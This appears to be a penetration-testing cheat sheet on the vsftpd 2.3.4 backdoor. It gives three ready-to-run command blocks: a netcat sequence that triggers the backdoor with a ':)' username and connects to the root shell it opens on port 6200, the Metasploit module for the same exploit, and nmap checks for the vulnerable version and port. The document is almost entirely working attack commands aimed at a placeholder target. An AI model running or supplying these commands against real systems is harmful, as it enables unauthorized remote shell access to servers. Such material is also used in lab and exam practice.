# vsftpd

### vsftpd 2.3.4 Backdoor

Smiley face backdoor — Triggered by username containing `:)`

```bash
nc $IP 21
USER backdoor:)
PASS anything
# Opens shell on port 6200
nc $IP 6200
```

---

### Metasploit vsftpd backdoor

Automated exploitation — Fastest method

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS $IP
run
```

---

### Check if backdoor is present

Not all 2.3.4 installations have the backdoor — Verify first

```bash
nmap -sV -p 21 $IP
# If version shows 2.3.4, try the backdoor
nmap -p 6200 $IP
```

---
